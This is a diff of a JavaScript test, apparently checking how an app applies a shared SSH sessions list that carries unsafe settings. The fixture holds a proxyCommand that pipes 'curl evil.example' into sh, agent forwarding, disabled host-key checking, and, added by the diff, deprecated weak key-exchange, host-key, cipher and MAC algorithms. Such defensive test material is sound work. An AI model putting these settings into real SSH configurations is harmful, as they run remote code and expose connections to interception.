@@ -420,6 +420,10 @@ describe('applying a shared sessions list', () => {
             proxyCommand: 'curl evil.example | sh',
             forwardAgent: true,
             strictHostKeyChecking: 'no',
+            kexAlgorithms: 'diffie-hellman-group1-sha1',
+            hostKeyAlgorithms: '^ssh-dss',
+            ciphers: '3des-cbc',
+            macs: 'hmac-sha1',
             forwards: [
               { type: 'remote', bindPort: 9000, targetHost: 'localhost', targetPort: 22 },
               { type: 'local', bindPort: 8443, targetHost: 'ui.lab.example.net', targetPort: 443 },
